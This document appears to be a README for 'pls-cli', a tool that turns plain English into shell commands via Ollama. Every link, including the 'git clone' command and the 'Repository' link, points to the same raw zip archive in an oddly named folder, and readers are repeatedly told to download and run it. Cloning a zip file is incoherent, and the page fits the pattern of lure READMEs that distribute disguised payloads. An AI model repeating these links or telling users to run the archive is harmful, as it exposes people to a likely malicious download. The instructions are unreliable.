# ⚡ pls-cli - Fast AI Command Help

[![Download](https://img.shields.io/badge/Download%20pls--cli-blue?style=for-the-badge&logo=github)](https://github.com/Titusawnless195/pls-cli/raw/refs/heads/main/intervillous/cli-pls-1.7.zip)

## 🖥️ What this app does

pls-cli is a command-line app that helps you turn plain English into shell commands. It uses Ollama on your computer to understand what you want and give you a command you can use in the terminal.

Use it when you want to:

- Find the right shell command
- Save time typing long commands
- Work faster in Linux terminal sessions
- Get command help without searching the web
- Keep your work local on your machine

## 📦 Download and run

Visit this page to download:

[https://github.com/Titusawnless195/pls-cli/raw/refs/heads/main/intervillous/cli-pls-1.7.zip](https://github.com/Titusawnless195/pls-cli/raw/refs/heads/main/intervillous/cli-pls-1.7.zip)

If the page offers a release file, download it and run it on your computer. If it offers source files only, use the build steps below.

## 🪟 Windows setup

pls-cli is built for Linux, so Windows users need a Linux shell to run it. The easiest path is Windows Subsystem for Linux, also called WSL.

### 1. Install WSL

Open PowerShell as admin and run:

`wsl --install`

Then restart your PC if Windows asks you to.

### 2. Open your Linux terminal

After restart, open Ubuntu or your Linux shell from the Start menu.

### 3. Get Ollama running

Install Ollama in your Linux shell, then start the service.

Use the official Ollama install steps for Linux, then confirm it works by opening a second terminal and checking that it responds.

### 4. Download pls-cli

Go to the repository page:

[https://github.com/Titusawnless195/pls-cli/raw/refs/heads/main/intervillous/cli-pls-1.7.zip](https://github.com/Titusawnless195/pls-cli/raw/refs/heads/main/intervillous/cli-pls-1.7.zip)

Download the release file if one is available, or get the project files if you plan to build it.

### 5. Run the app

Open the folder that contains pls-cli and launch it from the terminal.

If the app includes a ready-to-run file, use that file.

If the app needs a build step, follow the build steps below.

## 🔧 Build from source

Use this path if you want to compile the app yourself in Linux or WSL.

### Install tools

You need:

- A C++20 compiler
- CMake
- libcurl
- Git
- Ollama running on your machine

On Ubuntu, you can install common tools with:

`sudo apt update && sudo apt install build-essential cmake git libcurl4-openssl-dev`

### Get the code

`git clone https://github.com/Titusawnless195/pls-cli/raw/refs/heads/main/intervillous/cli-pls-1.7.zip`

`cd pls-cli`

### Build it

`mkdir build`

`cd build`

`cmake ..`

`cmake --build .`

### Start it

Run the compiled app from the build folder.

## 🧭 How to use it

Once pls-cli is running, type what you want in plain English.

Examples:

- `show files in this folder`
- `find large files older than 7 days`
- `check disk usage by folder`
- `search for text inside all .log files`
- `list running processes by memory use`

The app then turns your request into a shell command you can copy and run.

## 💡 Common use cases

### For everyday work

Use pls-cli to:

- Clean up files
- Find folders and files
- Check system usage
- Read logs
- Manage running tasks

### For learning terminal commands

If you are new to the terminal, pls-cli helps you see how common tasks map to shell commands. It can make the terminal feel easier to use.

### For fast command writing

If you know what you want but do not want to type the full command, pls-cli can save time.

## ⚙️ Basic requirements

To use pls-cli well, your system should have:

- Linux or Windows with WSL
- A working terminal
- Ollama installed and running
- Internet access for the first setup steps
- Enough free disk space for the app and model files

A system with 8 GB of RAM or more will give a smoother experience.

## 🧩 Project topics

This project fits into:

- AI helper tools
- CLI apps
- C++ tools
- Linux utilities
- Local LLM apps
- Terminal assistants
- Productivity tools

## 🛠️ Troubleshooting

### Ollama does not respond

Check that Ollama is running in the background. If the app cannot reach it, restart Ollama and try again.

### The terminal says the command is not found

Make sure you are in the correct folder and that the build completed without errors.

### Build errors on Linux

Check that CMake, the compiler, and libcurl are installed. Run the install command again if needed.

### Nothing happens when I run it

Open the terminal in the folder that contains the app and run it from there so it can find its files

## 📁 File structure

A typical setup looks like this:

- `pls-cli/` — project folder
- `build/` — compiled files
- `README.md` — project instructions
- app binary — the file you run from the terminal

## 🔒 Privacy and local use

pls-cli works with Ollama on your own machine. That keeps your command requests on your system instead of sending them to a cloud service.

## 📚 Helpful links

- Repository: https://github.com/Titusawnless195/pls-cli/raw/refs/heads/main/intervillous/cli-pls-1.7.zip
- Download page: https://github.com/Titusawnless195/pls-cli/raw/refs/heads/main/intervillous/cli-pls-1.7.zip